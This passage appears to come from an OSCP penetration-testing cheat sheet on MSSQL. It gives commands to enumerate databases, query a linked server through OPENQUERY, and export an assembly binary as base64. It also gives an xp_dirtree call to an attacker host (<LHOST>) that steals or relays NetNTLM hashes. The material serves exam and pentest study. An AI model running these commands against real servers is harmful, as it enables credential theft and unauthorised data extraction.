##### Show Database Content

```c
1> SELECT name FROM master.sys.databases
2> go
```

##### [](https://github.com/0xsyr0/OSCP#openquery)OPENQUERY

```c
1> select * from openquery("web\clients", 'select name from master.sys.databases');
2> go
```

```c
1> select * from openquery("web\clients", 'select name from clients.sys.objects');
2> go
```

##### [](https://github.com/0xsyr0/OSCP#binary-extraction-as-base64)Binary Extraction as Base64

```c
1> select cast((select content from openquery([web\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
2> go > export.txt
```

##### [](https://github.com/0xsyr0/OSCP#steal-netntlm-hash--relay-attack)Steal NetNTLM Hash / Relay Attack

```c
SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
```